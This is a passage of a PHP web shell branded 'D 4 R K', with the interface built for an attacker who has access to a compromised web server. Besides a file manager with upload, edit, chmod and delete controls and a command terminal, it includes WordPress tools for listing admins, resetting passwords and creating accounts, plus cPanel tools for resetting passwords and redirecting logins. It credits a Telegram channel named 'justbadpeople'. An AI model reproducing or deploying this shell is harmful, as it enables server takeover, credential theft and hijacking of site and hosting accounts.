    border: none; border-bottom: 1px solid var(--line);
    border-radius: 0;
    padding: 14px 16px;
    font-size: 13px;
    background: transparent;
  }
  .palette-input:focus { border-bottom-color: var(--line-hot); }
  .palette-list { max-height: 340px; overflow: auto; padding: 4px; }
  .palette-item {
    padding: 8px 12px;
    font-size: 12px;
    color: var(--fg-dim);
    border-radius: 4px;
    cursor: pointer;
    display: flex; align-items: center; gap: 10px;
  }
  .palette-item svg { width: 13px; height: 13px; color: var(--fg-faint); }
  .palette-item.sel, .palette-item:hover { background: var(--panel); color: var(--white); }
  .palette-item.sel svg, .palette-item:hover svg { color: var(--green); }

  /* ───── info panels ───── */
  .info-grid {
    display: grid;
    grid-template-columns: 120px 1fr;
    gap: 8px 16px;
    font-size: 12px;
  }
  .info-grid .k { color: var(--fg-faint); text-transform: uppercase; letter-spacing: 1px; font-size: 10px; padding-top: 2px; }
  .info-grid .v { font-family: ui-monospace, Menlo, Consolas, monospace; color: var(--fg); word-break: break-all; }

  /* ───── toasts ───── */
  .toasts { position: fixed; bottom: 16px; right: 16px; z-index: 200; display: flex; flex-direction: column; gap: 6px; pointer-events: none; }
  .toast {
    background: var(--panel-2);
    border: 1px solid var(--line-hot);
    border-left: 3px solid var(--green);
    border-radius: 4px;
    padding: 8px 14px;
    font-size: 12px;
    color: var(--fg);
    animation: slidein .15s ease;
    box-shadow: 0 4px 20px rgba(0,0,0,.4);
    max-width: 320px;
  }
  @keyframes slidein { from { transform: translateX(20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

  /* ───── credit ───── */
  .credit {
    padding: 10px 20px;
    border-top: 1px solid var(--line);
    font-size: 11px;
    color: var(--fg-faint);
    display: flex; align-items: center; gap: 8px;
    flex-wrap: wrap;
  }
  .credit a { color: var(--fg-dim); display: inline-flex; align-items: center; gap: 4px; }
  .credit a:hover { color: var(--white); }
  .credit svg { width: 12px; height: 12px; fill: currentColor; }
  .credit .sep { color: var(--fg-ghost); }

  /* ───── WP / cPanel result rendering ───── */
  .scan-row {
    display: grid;
    grid-template-columns: 130px 1fr;
    gap: 8px 14px;
    padding: 8px 0;
    border-bottom: 1px solid var(--line);
    font-size: 12px;
    align-items: baseline;
  }
  .scan-row:last-child { border-bottom: none; }
  .scan-row .k { color: var(--fg-faint); text-transform: uppercase; letter-spacing: 1px; font-size: 10px; }
  .scan-row .v { color: var(--fg); word-break: break-all; font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 12px; }
  .scan-row .v.ok { color: var(--green); }
  .scan-row .v.bad { color: var(--red); }
  .scan-row .v.warn { color: var(--yellow); }
  .wp-user-row {
    display: flex; align-items: center; gap: 12px;
    padding: 8px 0;
    border-bottom: 1px solid var(--line);
    font-size: 12px;
  }
  .wp-user-row:last-child { border-bottom: none; }
  .wp-user-row .login { font-family: ui-monospace, Menlo, Consolas, monospace; color: var(--white); min-width: 100px; }
  .wp-user-row .email { color: var(--fg-dim); flex: 1; font-size: 11px; }
  .wp-user-row .role { color: var(--fg-faint); font-size: 10px; text-transform: uppercase; letter-spacing: 1px; }
  .wp-user-row button { padding: 2px 8px; font-size: 11px; }
</style>
</head>
<body>

<!-- ═══ TOP BAR ═══ -->
<div class="topbar">
  <div class="brand">
    <div class="brand-logo">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="4 17 10 11 4 5"></polyline>
        <line x1="12" y1="19" x2="20" y2="19"></line>
      </svg>
    </div>
    <span>D 4 R K</span>
    <span class="brand-sub">//shell</span>
  </div>

  <div class="searchbar">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
    <input id="filter" placeholder="Filter files in this directory…  /" autocomplete="off" oninput="applyFilter(this.value)">
  </div>

  <div class="top-actions">
    <span class="status-pill <?= !empty($GLOBALS['_X']['fn']) ? '' : 'off' ?>">
      <span class="dot"></span>
      <?= !empty($GLOBALS['_X']['fn']) ? 'exec live' : 'exec off' ?>
    </span>
    <button class="icon-btn" onclick="openPalette()" title="Command palette (⌘K)">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
    </button>
    <button class="icon-btn" onclick="openSysInfo()" title="System info">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
    </button>
    <label class="btn-primary" style="display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border-radius:4px;background:var(--white);color:var(--bg);font-size:12px;font-weight:600;cursor:pointer">
      <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
      Upload
      <form method="post" enctype="multipart/form-data" action="?p=<?= rw_e($t) ?>" style="display:none">
        <input type="file" name="f[]" multiple onchange="this.form.submit()">
      </form>
      <input type="file" name="f[]" multiple style="display:none" onchange="uploadFiles(this.files)">
    </label>
  </div>
</div>

<!-- ═══ LAYOUT ═══ -->
<div class="layout">

  <!-- SIDEBAR -->
  <aside class="sidebar">
    <div class="side-block">
      <div class="side-head">Navigator</div>
      <?php
      $roots = [
          ['/', 'Filesystem', 'hard-drive'],
          [getcwd(), 'Working dir', 'folder'],
          ['/var/www', 'www', 'globe'],
          ['/tmp', 'tmp', 'archive'],
          ['/etc', 'etc', 'settings'],
          ['/home', 'home', 'home'],
          ['/root', 'root', 'key'],
      ];
      foreach ($roots as [$p, $lbl, $icon]):
          if (!is_dir($p)) continue;
      ?>
      <a class="side-link <?= $t === $p ? 'active' : '' ?>" href="?p=<?= rw_e($p) ?>">
        <?= side_icon($icon) ?>
        <span class="side-lbl"><?= htmlspecialchars($lbl) ?></span>
      </a>
      <?php endforeach; ?>
    </div>

    <div class="side-block">
      <div class="side-head">WordPress</div>
      <a class="side-link" onclick="openWpDetect()">
        <?= side_icon('search') ?>
        <span class="side-lbl">Detect WP</span>
      </a>
      <a class="side-link" onclick="openWpUsers()">
        <?= side_icon('users') ?>
        <span class="side-lbl">List admins</span>
      </a>
      <a class="side-link" onclick="openWpReset()">
        <?= side_icon('key') ?>
        <span class="side-lbl">Reset password</span>
      </a>
      <a class="side-link" onclick="openWpCreate()">
        <?= side_icon('user-plus') ?>
        <span class="side-lbl">Create account</span>
      </a>
    </div>

    <div class="side-block">
      <div class="side-head">cPanel</div>
      <a class="side-link" onclick="openCpDetect()">
        <?= side_icon('search') ?>
        <span class="side-lbl">Detect cPanel</span>
      </a>
      <a class="side-link" onclick="openCpAccounts()">
        <?= side_icon('users') ?>
        <span class="side-lbl">List accounts</span>
      </a>
      <a class="side-link" onclick="openCpReset()">
        <?= side_icon('key') ?>
        <span class="side-lbl">Reset password</span>
      </a>
      <a class="side-link" onclick="openCpRedirect()">
        <?= side_icon('external-link') ?>
        <span class="side-lbl">Redirect login</span>
      </a>
    </div>

    <div class="side-block">
      <div class="side-head">Utilities</div>
      <a class="side-link" onclick="openPalette()">
        <?= side_icon('terminal') ?>
        <span class="side-lbl">Command palette</span>
        <span class="side-meta">⌘K</span>
      </a>
      <a class="side-link" onclick="openSysInfo()">
        <?= side_icon('cpu') ?>
        <span class="side-lbl">System info</span>
      </a>
      <a class="side-link" onclick="openProcs()">
        <?= side_icon('activity') ?>
        <span class="side-lbl">Processes</span>
      </a>
      <a class="side-link" onclick="openNet()">
        <?= side_icon('wifi') ?>
        <span class="side-lbl">Network</span>
      </a>
      <a class="side-link" onclick="openSearch()">
        <?= side_icon('search') ?>
        <span class="side-lbl">Deep search</span>
      </a>
    </div>

    <?php if ($hist): ?>
    <div class="side-block">
      <div class="side-head">Recent commands</div>
      <?php foreach (array_slice($hist, 0, 6) as $h): ?>
      <a class="side-link" onclick="sendCmd(<?= htmlspecialchars(json_encode($h), ENT_QUOTES) ?>)">
        <?= side_icon('chevron-right') ?>
        <span class="side-lbl mono"><?= htmlspecialchars(substr($h, 0, 24)) ?><?= strlen($h) > 24 ? '…' : '' ?></span>
      </a>
      <?php endforeach; ?>
    </div>
    <?php endif; ?>

    <div class="side-spacer"></div>

    <div class="side-footer">
      <a class="side-link" href="?p=<?= rw_e('/') ?>">
        <?= side_icon('layout-dashboard') ?>
        <span class="side-lbl">Dashboard</span>
      </a>
    </div>
  </aside>

  <!-- MAIN -->
  <main class="main">

    <!-- PATHBAR -->
    <div class="pathbar">
      <a class="up-btn" href="?p=<?= rw_e($parent) ?>" title="Up one level">
        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 15l-6-6-6 6"/></svg>
      </a>
      <span class="sep">/</span>
      <a href="?p=<?= rw_e('/') ?>">root</a>
      <?php foreach ($crumbs as $i => $c): ?>
        <span class="sep">/</span>
        <a href="?p=<?= rw_e($c['p']) ?>" class="<?= $i === count($crumbs)-1 ? 'here' : '' ?>"><?= htmlspecialchars($c['n']) ?></a>
      <?php endforeach; ?>
    </div>

    <!-- TOOLBAR -->
    <div class="toolbar">
      <button onclick="openMk('dir')">
        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
        New folder
      </button>
      <button onclick="openMk('file')">
        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
        New file
      </button>
      <?php if ($cb): ?>
      <button class="primary" onclick="doPaste()">
        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
        Paste · <?= htmlspecialchars(basename($cb['src'])) ?>
      </button>
      <?php endif; ?>
      <div class="spacer"></div>
      <span class="lbl">View</span>
      <div class="view-switch">
        <button id="vGrid" class="on" onclick="setView('grid')">
          <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
          Grid
        </button>
        <button id="vList" onclick="setView('list')">
          <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
          List
        </button>
      </div>
    </div>

    <?php if ($msg): ?>
      <div class="msg-bar">[+] <?= htmlspecialchars($msg) ?></div>
    <?php endif; ?>

    <!-- FILE GRID -->
    <div id="gridView" class="grid-wrap">
      <div class="file-grid">
        <?php foreach ($fs as $f):
          if ($f === '.' || $f === '..') continue;
          $full = $t . '/' . $f;
          $isd = is_dir($full);
          $isl = is_link($full);
          $sz = $isd ? '—' : rw_size(@filesize($full));
          $mt = date('y.m.d H:i', @filemtime($full));
          $ef = rw_e($full);
          $pmHtml = rw_perm_html($full);
          $cls = $isd ? 'is-dir' : ($isl ? 'is-link' : '');
        ?>
        <div class="file-card <?= $cls ?>" data-name="<?= htmlspecialchars(strtolower($f)) ?>">
          <div class="file-card-head">
            <div class="file-icon-box">
              <?php if ($isd): ?>
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
              <?php elseif ($isl): ?>
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
              <?php else: ?>
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
              <?php endif; ?>
            </div>
            <div class="file-ops">
              <?php if (!$isd): ?>
                <button class="icon-btn" title="Edit" onclick="openEdit(<?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>)">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4z"/></svg>
                </button>
                <a class="icon-btn" title="Download" href="?o=<?= rw_e('dl') ?>&a=<?= $ef ?>">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                </a>
                <button class="icon-btn" title="Hash" onclick="openHash(<?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>)">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>
                </button>
              <?php endif; ?>
              <button class="icon-btn" title="Rename" onclick="openRename(<?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>,<?= htmlspecialchars(json_encode($f), ENT_QUOTES) ?>)">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 7 4 4 20 4 20 7"/><line x1="9" y1="20" x2="15" y2="20"/><line x1="12" y1="4" x2="12" y2="20"/></svg>
              </button>
              <button class="icon-btn" title="Permissions" onclick="openChmod(<?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>, '<?= substr(sprintf('%o', @fileperms($full)), -4) ?>')">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
              </button>
              <button class="icon-btn danger" title="Delete" onclick="askDel(<?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>,<?= htmlspecialchars(json_encode($f), ENT_QUOTES) ?>, <?= $isd ? 'true' : 'false' ?>)">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
              </button>
            </div>
          </div>
          <a class="file-name" href="<?= $isd ? '?p=' . $ef : 'javascript:openEdit(' . htmlspecialchars(json_encode($full), ENT_QUOTES) . ')' ?>"><?= htmlspecialchars($f) ?><?= $isd ? '/' : '' ?></a>
          <div class="file-meta">
            <span><?= $sz ?></span>
            <?= $pmHtml ?>
          </div>
        </div>
        <?php endforeach; ?>
        <?php if (!count(array_diff($fs, ['.', '..']))): ?>
          <div class="empty-state" style="grid-column: 1/-1">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
            <div>Empty directory</div>
          </div>
        <?php endif; ?>
      </div>
    </div>

    <!-- FILE LIST -->
    <div id="listView" style="display:none">
      <table class="file-list">
        <thead>
          <tr>
            <th style="width:30px"></th>
            <th>Name</th>
            <th style="width:90px">Size</th>
            <th style="width:80px">Mode</th>
            <th style="width:140px">Modified</th>
            <th style="width:180px; text-align:right">Actions</th>
          </tr>
        </thead>
        <tbody>
          <?php foreach ($fs as $f):
            if ($f === '.' || $f === '..') continue;
            $full = $t . '/' . $f;
            $isd = is_dir($full);
            $isl = is_link($full);
            $ef = rw_e($full);
            $pmHtml = rw_perm_html($full);
          ?>
          <tr class="<?= $isd ? 'is-dir' : '' ?>" data-name="<?= htmlspecialchars(strtolower($f)) ?>">
            <td><input type="checkbox" class="rowck" value="<?= $ef ?>"></td>
            <td>
              <a class="file-row-name" href="<?= $isd ? '?p=' . $ef : 'javascript:openEdit(' . htmlspecialchars(json_encode($full), ENT_QUOTES) . ')' ?>"><?= htmlspecialchars($f) ?><?= $isd ? '/' : '' ?><?= $isl ? ' →' : '' ?></a>
            </td>
            <td class="dim mono" style="font-family:ui-monospace,Menlo,monospace;font-size:11px"><?= $isd ? '—' : rw_size(@filesize($full)) ?></td>
            <td><?= $pmHtml ?></td>
            <td class="dim mono" style="font-family:ui-monospace,Menlo,monospace;font-size:11px"><?= date('y.m.d H:i', @filemtime($full)) ?></td>
            <td>
              <div class="row-ops">
                <?php if (!$isd): ?>
                  <button class="icon-btn" title="Edit" onclick="openEdit(<?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4z"/></svg></button>
                  <a class="icon-btn" title="Download" href="?o=<?= rw_e('dl') ?>&a=<?= $ef ?>"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></a>
                <?php endif; ?>
                <button class="icon-btn" title="Rename" onclick="openRename(<?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>,<?= htmlspecialchars(json_encode($f), ENT_QUOTES) ?>)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 7 4 4 20 4 20 7"/><line x1="9" y1="20" x2="15" y2="20"/><line x1="12" y1="4" x2="12" y2="20"/></svg></button>
                <button class="icon-btn" title="Permissions" onclick="openChmod(<?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>, '<?= substr(sprintf('%o', @fileperms($full)), -4) ?>')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></button>
                <button class="icon-btn danger" title="Delete" onclick="askDel(<?= htmlspecialchars(json_encode($full), ENT_QUOTES) ?>,<?= htmlspecialchars(json_encode($f), ENT_QUOTES) ?>, <?= $isd ? 'true' : 'false' ?>)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg></button>
              </div>
            </td>
          </tr>
          <?php endforeach; ?>
        </tbody>
      </table>
      <div class="bulk-bar">
        <button onclick="bulkZip()"><svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 8v13H3V8"/><path d="M1 3h22v5H1z"/><path d="M10 12h4"/></svg> Zip selected</button>
        <button onclick="bulkClip('copy')"><svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
        <button onclick="bulkClip('cut')"><svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><circle cx="6" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><line x1="20" y1="4" x2="8.12" y2="15.88"/><line x1="14.47" y1="14.48" x2="20" y2="20"/><line x1="8.12" y1="8.12" x2="12" y2="12"/></svg> Cut</button>
      </div>
    </div>

    <!-- TERMINAL -->
    <div class="terminal">
      <div class="term-head">
        <div class="dots"><span></span><span></span><span></span></div>
        <span class="label">Terminal</span>
        <span class="cwd"><?= htmlspecialchars($t) ?></span>
      </div>
      <div class="term-input">
        <span class="ps">$</span>
        <input id="cmd" autocomplete="off" spellcheck="false" placeholder="id · whoami · ls -la · uname -a" onkeydown="if(event.key==='Enter'){event.preventDefault();execCmd()}">
        <button class="primary" onclick="execCmd()">Run</button>
      </div>
      <pre id="out" class="term-out"><span class="dim">// ready · press ⌘K for palette · / to filter · Ctrl+` for terminal</span></pre>
    </div>

    <!-- CREDIT -->
    <div class="credit">
      <span class="mono">D 4 R K</span>
      <span class="sep">·</span>
      <span>by</span>
      <a href="https://t.me/justbadpeople" target="_blank" rel="noopener">
        <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
        jue vs everybody
      </a>
      <span class="sep">·</span>
      <a href="https://t.me/justbadpeople" target="_blank" rel="noopener" class="mono">t.me/justbadpeople</a>
    </div>

  </main>
</div>

<!-- ═══ MODALS ═══ -->

<!-- editor -->
<div id="mEdit" class="modal-bg hidden">
  <div class="modal wide">
    <div class="modal-head">
      <span class="title">Editor</span>
      <span class="path" id="editPath">—</span>
      <span class="x" onclick="hide('mEdit')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span>
    </div>
    <div class="modal-body" style="padding:0">
      <textarea id="editBody" class="mono" style="border:none;border-radius:0;padding:14px 16px;background:#0a0a0a;color:#e8e8e8;font-size:12px;line-height:1.6;min-height:480px;resize:none"></textarea>
    </div>
    <div class="modal-foot">
      <span class="meta" id="editMeta">—</span>
      <button onclick="hide('mEdit')">Cancel</button>
      <button class="primary" onclick="saveEdit()">Save</button>
    </div>
  </div>
</div>

<!-- rename -->
<div id="mRename" class="modal-bg hidden">
  <div class="modal" style="max-width: 460px">
    <div class="modal-head"><span class="title">Rename</span><span class="x" onclick="hide('mRename')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body"><div class="field"><label>New name</label><input id="renameVal" class="mono" autocomplete="off"></div></div>
    <div class="modal-foot">
      <button onclick="hide('mRename')">Cancel</button>
      <button class="primary" onclick="doRename()">Rename</button>
    </div>
  </div>
</div>

<!-- chmod -->
<div id="mChmod" class="modal-bg hidden">
  <div class="modal" style="max-width: 500px">
    <div class="modal-head"><span class="title">Permissions</span><span class="x" onclick="hide('mChmod')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body">
      <div class="field">
        <label>Octal mode</label>
        <input id="chmodVal" class="mono" placeholder="0755" autocomplete="off">
        <div class="chmod-presets">
          <button onclick="$('chmodVal').value='0644'">644 rw-r--r--</button>
          <button onclick="$('chmodVal').value='0755'">755 rwxr-xr-x</button>
          <button onclick="$('chmodVal').value='0777'">777 rwxrwxrwx</button>
          <button onclick="$('chmodVal').value='0600'">600 rw-------</button>
          <button onclick="$('chmodVal').value='0700'">700 rwx------</button>
        </div>
      </div>
      <div class="field">
        <label>Quick legend</label>
        <div class="dim" style="font-size:11px;line-height:1.7">
          <span class="green" style="font-weight:600">7</span> = rwx (read · write · execute)<br>
          <span class="white">5</span> = r-x (read · execute)<br>
          <span class="ghost">0</span> = --- (none)<br>
          Format: <span class="mono">[owner][group][other]</span>
        </div>
      </div>
    </div>
    <div class="modal-foot">
      <button onclick="hide('mChmod')">Cancel</button>
      <button class="primary" onclick="doChmod()">Apply</button>
    </div>
  </div>
</div>

<!-- touch -->
<div id="mTouch" class="modal-bg hidden">
  <div class="modal" style="max-width: 460px">
    <div class="modal-head"><span class="title">Touch · mtime</span><span class="x" onclick="hide('mTouch')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body"><div class="field"><label>Date &amp; time</label><input type="datetime-local" id="touchVal"></div></div>
    <div class="modal-foot">
      <button onclick="hide('mTouch')">Cancel</button>
      <button class="primary" onclick="doTouch()">Apply</button>
    </div>
  </div>
</div>

<!-- delete -->
<div id="mDel" class="modal-bg hidden">
  <div class="modal" style="max-width: 460px">
    <div class="modal-head"><span class="title red">Delete</span><span class="x" onclick="hide('mDel')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body">
      <div id="delMsg" style="font-size:13px">—</div>
      <label id="delRecWrap" style="display:none;color:var(--fg);text-transform:none;letter-spacing:0;font-size:12px;display:flex;align-items:center;gap:8px;margin-top:8px">
        <input type="checkbox" id="delRec" style="width:auto;accent-color:var(--red)"> Delete recursively
      </label>
    </div>
    <div class="modal-foot">
      <button onclick="hide('mDel')">Cancel</button>
      <button class="primary" style="background:var(--red);border-color:var(--red);color:#fff" onclick="doDel()">Delete</button>
    </div>
  </div>
</div>

<!-- mk -->
<div id="mMk" class="modal-bg hidden">
  <div class="modal" style="max-width: 460px">
    <div class="modal-head"><span class="title" id="mkTitle">Create</span><span class="x" onclick="hide('mMk')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body"><div class="field"><label>Name</label><input id="mkVal" class="mono" autocomplete="off"></div></div>
    <div class="modal-foot">
      <button onclick="hide('mMk')">Cancel</button>
      <button class="primary" onclick="doMk()">Create</button>
    </div>
  </div>
</div>

<!-- hash -->
<div id="mHash" class="modal-bg hidden">
  <div class="modal" style="max-width: 640px">
    <div class="modal-head"><span class="title">File hashes</span><span class="path" id="hashPath">—</span><span class="x" onclick="hide('mHash')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body" id="hashBody"></div>
    <div class="modal-foot"><button onclick="hide('mHash')">Close</button></div>
  </div>
</div>

<!-- sysinfo -->
<div id="mSys" class="modal-bg hidden">
  <div class="modal" style="max-width: 640px">
    <div class="modal-head"><span class="title">System info</span><span class="x" onclick="hide('mSys')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body" id="sysBody"><span class="dim">Loading…</span></div>
    <div class="modal-foot"><button onclick="hide('mSys')">Close</button></div>
  </div>
</div>

<!-- procs -->
<div id="mProcs" class="modal-bg hidden">
  <div class="modal wide" style="max-width: 900px;height:80vh">
    <div class="modal-head"><span class="title">Processes</span><span class="x" onclick="hide('mProcs')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div>
    <div class="modal-body" style="padding:0"><pre id="procsOut" class="term-out mono" style="max-height:none;height:100%;background:#000">Loading…</pre></div>
    <div class="modal-foot"><button onclick="hide('mProcs')">Close</button></div>
  </div>
</div>

<!-- net -->
<div id="mNet" class="modal-bg hidden">
  <div class="modal wide" style="max-width: 900px;height:80vh">
